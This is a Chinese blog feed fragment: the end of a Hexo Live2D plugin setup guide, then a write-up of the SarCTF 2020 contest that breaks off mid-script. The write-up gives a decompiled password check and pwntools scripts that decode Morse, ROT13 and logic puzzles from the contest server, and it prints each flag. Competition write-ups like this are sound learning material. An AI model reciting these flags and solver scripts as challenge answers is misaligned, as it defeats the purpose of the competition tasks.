title="安装流程"></a>安装流程</h2><ol><li>安装模块：<code>npm install --save hexo-helper-live2d</code></li><li>安装模型：<a href="https://github.com/xiazeyu/live2d-widget-models" target="_blank" rel="noopener">模型列表</a> <a href="https://huaji8.top/post/live2d-plugin-2.0/" target="_blank" rel="noopener">模型展示</a></li><li>配置_config.yml</li></ol><h2 id="配置-config-yml-1"><a href="#配置-config-yml-1" class="headerlink" title="配置_config.yml"></a>配置_config.yml</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">yaml</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># live-2d</span></span><br><span class="line"><span class="attr">live2d:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">scriptFrom:</span> <span class="string">jsdelivr</span> <span class="comment"># local</span></span><br><span class="line">  <span class="attr">pluginRootPath:</span> <span class="string">live2dw/</span></span><br><span class="line">  <span class="attr">pluginJsPath:</span> <span class="string">lib/</span></span><br><span class="line">  <span class="attr">pluginModelPath:</span> <span class="string">assets/</span></span><br><span class="line">  <span class="attr">tagMode:</span> <span class="literal">false</span></span><br><span class="line">  <span class="attr">debug:</span> <span class="literal">false</span></span><br><span class="line">  <span class="attr">model:</span></span><br><span class="line">    <span class="attr">use:</span> <span class="string">live2d-widget-model-hijiki</span> <span class="comment"># npm-module package name</span></span><br><span class="line">    <span class="comment"># use: wanko # 博客根目录/live2d_models/ 下的目录名</span></span><br><span class="line">    <span class="comment"># use: ./wives/wanko # 相对于博客根目录的路径</span></span><br><span class="line">    <span class="comment"># use: https://cdn.jsdelivr.net/npm/live2d-widget-model-wanko@1.0.5/assets/wanko.model.json # 你的自定义 url</span></span><br><span class="line">    <span class="attr">scale:</span> <span class="number">1</span></span><br><span class="line">    <span class="attr">hHeadPos:</span> <span class="number">0.5</span></span><br><span class="line">    <span class="attr">vHeadPos:</span> <span class="number">0.618</span></span><br><span class="line">  <span class="attr">display:</span></span><br><span class="line">    <span class="attr">superSample:</span> <span class="number">2</span></span><br><span class="line">    <span class="attr">position:</span> <span class="string">left</span> <span class="comment"># right</span></span><br><span class="line">    <span class="attr">width:</span> <span class="number">150</span></span><br><span class="line">    <span class="attr">height:</span> <span class="number">300</span></span><br><span class="line">    <span class="attr">hOffset:</span> <span class="number">20</span></span><br><span class="line">    <span class="attr">vOffset:</span> <span class="number">-90</span></span><br><span class="line">  <span class="attr">mobile:</span></span><br><span class="line">    <span class="attr">show:</span> <span class="literal">true</span></span><br><span class="line">    <span class="attr">scale:</span> <span class="number">1</span></span><br><span class="line">  <span class="attr">react:</span></span><br><span class="line">    <span class="attr">opacityDefault:</span> <span class="number">0.3</span></span><br><span class="line">    <span class="attr">opacityOnHover:</span> <span class="number">0.3</span></span><br><span class="line">    <span class="attr">opacity:</span> <span class="number">0.95</span>          <span class="comment"># 模型透明度</span></span><br></pre></td></tr></table></figure></div><blockquote><p>选择模型：将下载的模型(如live2d-widget-model-hijiki)填到model-&gt;use处</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Hexo </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Hexo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SarCTF Write(吐)Up(嘈)</title>
      <link href="/2020/02/16/sarctf-writeup/"/>
      <url>/2020/02/16/sarctf-writeup/</url>
      
        <content type="html"><![CDATA[<h1 id="SarCTF"><a href="#SarCTF" class="headerlink" title="SarCTF"></a>SarCTF</h1><p><a href="https://cdn.jsdelivr.net/gh/TaQini/CDN@master/img/new-sar.png" data-fancybox="group" data-caption="cover" class="fancybox"><img alt="cover" title="cover" data-src="https://cdn.jsdelivr.net/gh/TaQini/CDN@master/img/new-sar.png" src="/img/loading.gif" class="lazyload"></a></p><p>On February 15-16, 2020, the online CTF (jeopardy) competition was held - <strong><em>SarCTF</em></strong>, with the support of the <strong><em>Saratov State University</em></strong>.</p><p>鹅国某个大学主办的CTF，由于有时差，比赛15号晚上十点才开始，持续24小时。logo设计的不错，第一眼看上去，还以为右上角是只熊，仔细一看，原来是个帽子…不得不吐嘈一下主办方的服务器，十点一到，瞬间挤爆，各种连接不上，主办方折腾了半天，推迟到十点半，比赛终于开始了。</p><p>刷新了许久，终于刷出Challenges的我直接奔向逆向题，扫了一眼，一共有三道题，一道linux，两道win，由于担心服务器不一会儿后又会宕掉，于是就全下载了下来。</p><p>linux那题极为简单，1分钟就做完了，没成想，提交flag却卡了整整5分钟…交完flag的我，正准备解决剩下两道题，随手刷新了一下页面，嗯？？逆向的题消失了，只剩下我刚做的一道了…莫非是题目出问题了？于是看了看群里的消息，有个师傅吐嘈道：</p><blockquote><p>Yeah I went to input flag and it’s gone haha</p></blockquote><p>翻译：我刚想交flag，题目就消失了，哈哈(尬笑)。</p><p>主办方如是回答道：</p><blockquote><p>These two jobs <strong>will not</strong> be deleted and <strong>will not</strong> be returned.</p></blockquote><p>翻译：这两道题没有被删除，但是你也别想再看到他们了。</p><p>嗯？？这是什么神仙操作……</p><hr><p>说到官方交流群，倒是有不少好玩儿的，其中有位俄国老兄，发了张图片：</p><p><a href="https://cdn.jsdelivr.net/gh/TaQini/CDN@master/img/sar_wine.jpg" data-fancybox="group" data-caption="wine" class="fancybox"><img alt="wine" title="wine" data-src="https://cdn.jsdelivr.net/gh/TaQini/CDN@master/img/sar_wine.jpg" src="/img/loading.gif" class="lazyload"></a></p><p>一台电脑，一壶烈酒，点点灯光，此情此景，虽不乏惬意，却也是十分壮烈，不愧是战斗民族…</p><p>p.s.此时电脑屏幕显示的是502Error(网关挂掉了)</p><hr><p>好了，闲言少叙，回归正题，这次比赛是跟学校里的另外六名小伙伴儿组队参加的（我第一次组队参加线上赛！终于不是孤身一人了哈哈）虽说解出的题目不多，但也涨了不少见识。刚开赛的时候排名还比较靠前，大概在十几名，后来大家都困了就都去睡觉了，第二天一起来，排名就掉到了100开外，于是<del>一路猛追</del>，最终在417个队伍里面排名第47，也还不错啦~<br><a href="https://cdn.jsdelivr.net/gh/TaQini/CDN@master/img/sar_rankpng.png" data-fancybox="group" data-caption="rank" class="fancybox"><img alt="rank" title="rank" data-src="https://cdn.jsdelivr.net/gh/TaQini/CDN@master/img/sar_rankpng.png" src="/img/loading.gif" class="lazyload"></a><br><a href="https://cdn.jsdelivr.net/gh/TaQini/CDN@master/img/sar_mem.png" data-fancybox="group" data-caption="mem" class="fancybox"><img alt="mem" title="mem" data-src="https://cdn.jsdelivr.net/gh/TaQini/CDN@master/img/sar_mem.png" src="/img/loading.gif" class="lazyload"></a><br><a href="https://cdn.jsdelivr.net/gh/TaQini/CDN@master/img/sar_bd.png" data-fancybox="group" data-caption="bd" class="fancybox"><img alt="bd" title="bd" data-src="https://cdn.jsdelivr.net/gh/TaQini/CDN@master/img/sar_bd.png" src="/img/loading.gif" class="lazyload"></a><br><a href="https://cdn.jsdelivr.net/gh/TaQini/CDN@master/img/sar_tsolve.png" data-fancybox="group" data-caption="tsolve" class="fancybox"><img alt="tsolve" title="tsolve" data-src="https://cdn.jsdelivr.net/gh/TaQini/CDN@master/img/sar_tsolve.png" src="/img/loading.gif" class="lazyload"></a></p><p>这次比赛的题型居然没有<code>pwn</code>，不过多了个<code>PPC(Professional Programming Challenges)</code>，看着比较新鲜，其实就是考察编程能力，其实也没有考察什么编程能力，顶多算是处理<code>socket</code>的输入输出…</p><h1 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h1><h2 id="Crossw0rd"><a href="#Crossw0rd" class="headerlink" title="Crossw0rd"></a>Crossw0rd</h2><ul><li><p>题目描述：</p><blockquote><p>While the children were playing toys, Sherlock was solving crosswords in large volumes.</p><p><a href="https://cdn.jsdelivr.net/gh/TaQini/CDN@master/img/20200217015017.png" data-fancybox="group" data-caption="cw" class="fancybox"><img alt="cw" title="cw" data-src="https://cdn.jsdelivr.net/gh/TaQini/CDN@master/img/20200217015017.png" src="/img/loading.gif" class="lazyload"></a></p></blockquote></li><li><p>考察点：逆向分析</p></li><li><p>难度：入门</p></li><li><p>初始分值：1000</p></li><li><p>最终分值：309</p></li><li><p>完成人数：264</p></li></ul><p>非常简单的逆向分析题，首先反汇编程序，分析程序流程：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">check</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v1; <span class="comment">// [rsp+0h] [rbp-20h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Welcome. You're in function check. Please Enter a password to continue. 1 attempt remaining:"</span>);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">"%s"</span>, &amp;v1);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int8)e(&amp;v1) )</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"You cracked the system!"</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Wrong password! Your attempt is over."</span>);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>流程很简单，就是检查输入的字符串是否为flag，检查字符串的有6个函数，分别如下：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">_BOOL8 __fastcall <span class="title">e</span><span class="params">(<span class="keyword">char</span> *a1)</span></span>&#123;</span><br><span class="line">  <span class="keyword">bool</span> v1; <span class="comment">// al</span></span><br><span class="line">  v1 = a1[<span class="number">7</span>] == <span class="string">'5'</span> &amp;&amp; a1[<span class="number">17</span>] == <span class="string">'g'</span> &amp;&amp; a1[<span class="number">2</span>] == <span class="string">'A'</span> &amp;&amp; b(a1);</span><br><span class="line">  <span class="keyword">return</span> v1 != <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">_BOOL8 __fastcall <span class="title">b</span><span class="params">(<span class="keyword">char</span> *a1)</span></span>&#123;</span><br><span class="line">  <span class="keyword">bool</span> v1; <span class="comment">// al</span></span><br><span class="line">  v1 = a1[<span class="number">15</span>] == <span class="string">'i'</span> &amp;&amp; a1[<span class="number">9</span>] == <span class="string">'r'</span> &amp;&amp; a1[<span class="number">1</span>] == <span class="string">'L'</span> &amp;&amp; d(a1);</span><br><span class="line">  <span class="keyword">return</span> v1 != <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">_BOOL8 __fastcall <span class="title">d</span><span class="params">(<span class="keyword">char</span> *a1)</span></span>&#123;</span><br><span class="line">  <span class="keyword">bool</span> v1; <span class="comment">// al</span></span><br><span class="line">  v1 = a1[<span class="number">10</span>] == <span class="string">'3'</span> &amp;&amp; a1[<span class="number">18</span>] == <span class="string">'&#125;'</span> &amp;&amp; a1[<span class="number">6</span>] == <span class="string">'a'</span> &amp;&amp; f(a1);</span><br><span class="line">  <span class="keyword">return</span> v1 != <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>剩下的三个函数都差不多，就不一一列出了，其中<code>a1</code>就是我们输入的字符串，这些函数做的就是检查字符串中的某个字节是否正确。</p><p>解法很简单，只要在相应位置填入对应的字符，即可拼得flag（不用写脚本，打个草稿就行）：</p><p><a href="https://cdn.jsdelivr.net/gh/TaQini/CDN@master/img/IMG_20200216_234124_mh1581868534694~01.jpg" data-fancybox="group" data-caption="re" class="fancybox"><img alt="re" title="re" data-src="https://cdn.jsdelivr.net/gh/TaQini/CDN@master/img/IMG_20200216_234124_mh1581868534694~01.jpg" src="/img/loading.gif" class="lazyload"></a></p><blockquote><p>FLAG{3a5yr3v3r5ing}</p></blockquote><h1 id="PPC"><a href="#PPC" class="headerlink" title="PPC"></a>PPC</h1><h2 id="Mind-palace-I"><a href="#Mind-palace-I" class="headerlink" title="Mind palace I"></a>Mind palace I</h2><ul><li><p>题目描述：</p><blockquote><p>It looks like the situation is hopeless, there is no time to think. However, you can use the mind palace and solve all problems instantly.</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc 212.47.229.1 33001</span><br></pre></td></tr></table></figure></div><p><a href="https://img.vos.uz/i51i6ckn.gif" data-fancybox="group" data-caption="mp1" class="fancybox"><img alt="mp1" title="mp1" data-src="https://img.vos.uz/i51i6ckn.gif" src="/img/loading.gif" class="lazyload"></a></p></blockquote></li><li><p>考察点：摩尔斯电码、socket编程</p></li><li><p>难度：简单</p></li><li><p>初始分值：1000</p></li><li><p>最终分值：802</p></li><li><p>完成人数：142</p></li></ul><p><code>nc</code>连接上题目，显示有一个字符串<code>pip</code>，过了一会儿变成了<code>piiiip</code>，过了一会又变回去了，就这样一直跳来跳去……刚开始没意识到，后来经过<a href="https://imagin.vip/" target="_blank" rel="noopener">imagin</a>师傅提醒，可能是摩尔斯电码，于是dump出数据，将<code>pip</code>视作<code>.</code>(dot)，将<code>piiiip</code>视作<code>-</code>(dash)，得到摩尔斯电码：</p><blockquote><p>…. . .-. .   ..- .–. — -.   - …. .   .-.. .- .–. . .-..   — ..-.   – -.–   -.-. — .- -   -.– — ..-   – .- -.–   … . .   - …. .   .-. .. -… -… — -.   — ..-.   – -.–   -.. . -.-. — .-. .- - .. — -.   -… ..- -   - …. .   – . -.. .- .-..   .. - … . .-.. ..-.   ..   -.- . . .–.   .. -.   .-   .-.. . .- - …. . .-. -.   .–. — ..- -.-. ….   .- -   …. — – .   ..-. .-.. .- –.   … …. . .-. .-.. — -.-. -.-   .-.. .. -.- . …   -.– — ..- .-.   – — .-. … . </p></blockquote><p>解密后得到字符串：</p><blockquote><p>HERE UPON THE LAPEL OF MY COAT YOU MAY SEE THE RIBBON OF MY DECORATION BUT THE MEDAL ITSELF I KEEP IN A LEATHERN POUCH AT HOME FLAG SHERLOCK LIKES YOUR MORSE</p></blockquote><p>刚开始直接扔到google翻译里，愣是没找到Flag在哪儿，后来仔细看了下，倒数5个单词开始就是FLAG</p><blockquote><p>FLAG{SHERLOCK_LIKES_YOUR_MORSE}</p></blockquote><p>dump数据的脚本如下：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="comment">#__author__:TaQini</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">'212.47.229.1'</span>, <span class="number">33001</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># context.log_level = 'debug'</span></span><br><span class="line"></span><br><span class="line">se      = <span class="keyword">lambda</span> data               :p.send(data) </span><br><span class="line">sa      = <span class="keyword">lambda</span> delim,data         :p.sendafter(delim, data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :p.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim,data         :p.sendlineafter(delim, data)</span><br><span class="line">sea     = <span class="keyword">lambda</span> delim,data         :p.sendafter(delim, data)</span><br><span class="line">rc      = <span class="keyword">lambda</span> numb=<span class="number">4096</span>          :p.recv(numb)</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims, drop=<span class="literal">True</span>  :p.recvuntil(delims, drop)</span><br><span class="line">uu32    = <span class="keyword">lambda</span> data               :u32(data.ljust(<span class="number">4</span>, <span class="string">'\0'</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data               :u64(data.ljust(<span class="number">8</span>, <span class="string">'\0'</span>))</span><br><span class="line">info_addr = <span class="keyword">lambda</span> tag, addr        :p.info(tag + <span class="string">': &#123;:#x&#125;'</span>.format(addr))</span><br><span class="line"></span><br><span class="line">l = []</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">solve</span><span class="params">(ans=<span class="string">'-1'</span>)</span>:</span></span><br><span class="line">    data = ru(<span class="string">'\r'</span>)</span><br><span class="line">    <span class="keyword">print</span> data</span><br><span class="line">    l.append(data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1200</span>):</span><br><span class="line">    solve()</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> l</span><br><span class="line"></span><br><span class="line"><span class="comment"># dump morse code:</span></span><br><span class="line"><span class="comment"># HERE UPON THE LAPEL OF MY COAT YOU MAY SEE THE RIBBON OF MY DECORATION BUT THE MEDAL ITSELF I KEEP IN A LEATHERN POUCH AT HOME FLAG SHERLOCK LIKES YOUR MORSE</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># FLAG&#123;SHERLOCK_LIKES_YOUR_MORSE&#125;</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div><h2 id="Mind-palace-II"><a href="#Mind-palace-II" class="headerlink" title="Mind palace II"></a>Mind palace II</h2><ul><li><p>题目描述：</p><blockquote><p>It’s time to strain your brains.</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc 212.47.229.1 33002</span><br></pre></td></tr></table></figure></div><p><a href="https://img.vos.uz/b811lei3.gif" data-fancybox="group" data-caption="mp2" class="fancybox"><img alt="mp2" title="mp2" data-src="https://img.vos.uz/b811lei3.gif" src="/img/loading.gif" class="lazyload"></a></p></blockquote></li><li><p>考察点：ROT13、socket编程</p></li><li><p>难度：简单</p></li><li><p>初始分值：1000</p></li><li><p>最终分值：890</p></li><li><p>完成人数：106</p></li></ul><p><code>nc</code>连接上题目后，显示如下内容，分析下不难看出message为密文，将其<code>rot13</code>解密之后的结果输入answer中，就会出现下一个密文</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">shell</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> nc 212.47.229.1 33002</span></span><br><span class="line">===============================================</span><br><span class="line">Telegrams come very quickly</span><br><span class="line">Help Sherlock Holmes decipher all messages</span><br><span class="line">===============================================</span><br><span class="line">Message:  CERHAVBAF</span><br><span class="line">Answer: PREUNIONS</span><br><span class="line">Message:  FGHZCREF</span><br><span class="line">Answer:</span><br></pre></td></tr></table></figure></div><p>解密100轮之后就会给flag，脚本如下：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="comment">#__author__:TaQini</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">'212.47.229.1'</span>, <span class="number">33002</span>)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">se      = <span class="keyword">lambda</span> data               :p.send(data) </span><br><span class="line">sa      = <span class="keyword">lambda</span> delim,data         :p.sendafter(delim, data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :p.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim,data         :p.sendlineafter(delim, data)</span><br><span class="line">sea     = <span class="keyword">lambda</span> delim,data         :p.sendafter(delim, data)</span><br><span class="line">rc      = <span class="keyword">lambda</span> numb=<span class="number">4096</span>          :p.recv(numb)</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims, drop=<span class="literal">True</span>  :p.recvuntil(delims, drop)</span><br><span class="line">uu32    = <span class="keyword">lambda</span> data               :u32(data.ljust(<span class="number">4</span>, <span class="string">'\0'</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data               :u64(data.ljust(<span class="number">8</span>, <span class="string">'\0'</span>))</span><br><span class="line">info_addr = <span class="keyword">lambda</span> tag, addr        :p.info(tag + <span class="string">': &#123;:#x&#125;'</span>.format(addr))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">solve</span><span class="params">(ans=<span class="string">'-1'</span>)</span>:</span></span><br><span class="line">    ru(<span class="string">'Message:  '</span>)</span><br><span class="line">    data = ru(<span class="string">'\n'</span>)</span><br><span class="line">    ru(<span class="string">'Answer: '</span>)</span><br><span class="line">    <span class="keyword">print</span> data</span><br><span class="line">    data = data.decode(<span class="string">'rot13'</span>)</span><br><span class="line">    <span class="keyword">print</span> data</span><br><span class="line">    <span class="keyword">if</span>(ans!=<span class="string">'-1'</span>):</span><br><span class="line">        sl(ans)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        sl(str(data))</span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    solve()</span><br><span class="line">    <span class="keyword">print</span> i</span><br><span class="line">    i+=<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># find flag after 100 times </span></span><br><span class="line"><span class="comment"># FLAG&#123;Y0U_V3RY_F45T3R_CRYPT0GR4PH&#125;</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div><h2 id="Mind-palace-III"><a href="#Mind-palace-III" class="headerlink" title="Mind palace III"></a>Mind palace III</h2><ul><li><p>题目描述：</p><blockquote><p>100% of brain CPU</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc 212.47.229.1 33003</span><br></pre></td></tr></table></figure></div><p><a href="https://cdn.jsdelivr.net/gh/TaQini/CDN@master/img/20200217015439.png" data-fancybox="group" data-caption="mp3" class="fancybox"><img alt="mp3" title="mp3" data-src="https://cdn.jsdelivr.net/gh/TaQini/CDN@master/img/20200217015439.png" src="/img/loading.gif" class="lazyload"></a></p></blockquote></li><li><p>考察点：逻辑运算、socket编程</p></li><li><p>难度：简单</p></li><li><p>初始分值：1000</p></li><li><p>最终分值：896</p></li><li><p>完成人数：103</p></li></ul><p><code>nc</code>连接上题目后，显示如下内容，分析下不难看出是要输入<strong>逻辑运算</strong>后的结果，结果正确就会出现下一个运算式：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">shell</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> nc 212.47.229.1 33003</span></span><br><span class="line">===============================================</span><br><span class="line">Let's see how quickly you can solve these examples</span><br><span class="line">===============================================</span><br><span class="line"><span class="meta">[&gt;</span><span class="bash">] 41 OR 103</span></span><br><span class="line"><span class="meta">[&gt;</span><span class="bash">] Result: 111</span></span><br><span class="line"><span class="meta">[&gt;</span><span class="bash">] 49 XOR 80</span></span><br><span class="line"><span class="meta">[&gt;</span><span class="bash">] Result:</span></span><br></pre></td></tr></table></figure></div><p>算对100次之后就会给flag，脚本如下：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span 